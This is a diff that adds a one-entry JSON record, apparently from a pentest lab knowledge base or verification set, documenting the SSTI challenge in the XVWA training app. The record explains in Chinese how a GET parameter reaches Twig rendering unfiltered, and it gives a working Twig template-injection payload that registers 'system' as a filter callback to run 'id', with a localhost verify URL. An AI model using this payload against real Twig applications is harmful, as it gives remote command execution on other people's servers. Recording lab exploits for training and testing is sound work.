@@ -1,0 +1,15 @@
+[
+  {
+    "id": "auto-20261030175456",
+    "context": "XVWA SSTI 关：GET 参数 name 直接进 Twig_Loader_String 模板渲染，无过滤。{{7*7}} 回显 49 证明求值，Twig 老版本可用 _self.env 注册 system 回调执行命令。",
+    "reference_payload": "GET ?name={{7*7}}&submit= → 回显 Hello 49；GET ?name={{_self.env.registerUndefinedFilterCallback(\"system\")}}{{_self.env.getFilter(\"id\")}}&submit= → uid=33(www-data)",
+    "principle": "Twig SSTI → RCE：{{7*7}}=49 确认模板求值，_self.env.registerUndefinedFilterCallback('system')+getFilter('id') 注册并调用 system 执行系统命令",
+    "source": "xvwa",
+    "verify_url": "http://localhost:8084/xvwa/vulnerabilities/ssti/?name={payload}&submit=",
+    "evidence": {
+      "verify": "echo",
+      "url": "http://localhost:8084/xvwa/vulnerabilities/ssti/?name={{_self.env.registerUndefinedFilterCallback(%22system%22)}}{{_self.env.getFilter(%22id%22)}}&submit=",
+      "match": "uid="
+    }
+  }
+]
